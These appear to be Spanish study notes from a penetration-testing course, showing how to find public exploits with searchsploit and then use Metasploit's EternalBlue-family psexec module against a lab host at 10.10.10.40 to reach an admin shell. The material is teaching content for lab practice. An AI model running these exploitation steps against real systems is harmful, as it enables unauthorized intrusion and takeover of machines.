Una vez que identificamos los servicios que se ejecutan en los puertos identificados desde nuestro escaneo de Nmap, el primer paso es ver si alguna de las aplicaciones/servicios tiene algún exploit público.


# Entontrar Exploits Publicos
  
Muchas herramientas pueden ayudarnos a buscar exploits públicos para las diversas aplicaciones y servicios que podamos encontrar durante la fase de enumeración. Una forma de hacerlo es buscar en Google el nombre de la aplicación con el **exploit** para ver si obtenemos algún resultado. 

![[Pasted image 20250314203921.png]]

## searchsploit
Una herramienta conocida para este propósito es searchsploit, que podemos utilizar para buscar vulnerabilidades/exploits públicos para cualquier aplicación.

Instalación
```shell-session
sudo apt install exploitdb -y
```

Luego, podemos usar searchsploit para buscar una aplicación específica por su nombre, de la siguiente manera:
![[Pasted image 20250314205248.png]]
También podemos utilizar bases de datos de exploits en línea para buscar vulnerabilidades, como 
Exploit DB
Rapid7 DB 
Vulnerability Lab.

# Introducción a  Metasploit 

correr Metasploit
```shell-session
msfconsole
```

![[Pasted image 20250314210014.png]]
Una vez que Metasploit se esté ejecutando, podemos buscar nuestra aplicación objetivo con el comando "search exploit". Por ejemplo, podemos buscar la vulnerabilidad SMB que identificamos anteriormente:

![[Pasted image 20250314210214.png]]Consejo: La **búsqueda** puede aplicar filtros complejos, como buscar cve:2009 tipo:exploit. Ver todos los filtros con ayuda de búsqueda.


Encontramos un exploit para este servicio. Podemos usarlo copiando su nombre completo y usando USE:
```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec
```

![[Pasted image 20250314210550.png]]

Antes de ejecutar el exploit, debemos configurar sus opciones. Para ver las opciones disponibles, podemos usar el comando «show options»:
![[Pasted image 20250314210839.png]]

Asignamos los paramentos requeridos, algunos ya vienen predefinidos 
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```
![[Pasted image 20250314212453.png]]


Una vez configuradas ambas opciones, podemos iniciar la explotación. Sin embargo, antes de ejecutar el script, podemos realizar una comprobación para asegurarnos de que el servidor sea vulnerable:
![[Pasted image 20250314212615.png]]

Como podemos ver, el servidor es vulnerable. Tenga en cuenta que no todos los exploits de Metasploit Framework admiten la función de comprobación. Finalmente, podemos usar el comando "run" o "exploit" para ejecutar el exploit:
![[Pasted image 20250314213054.png]]
As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell.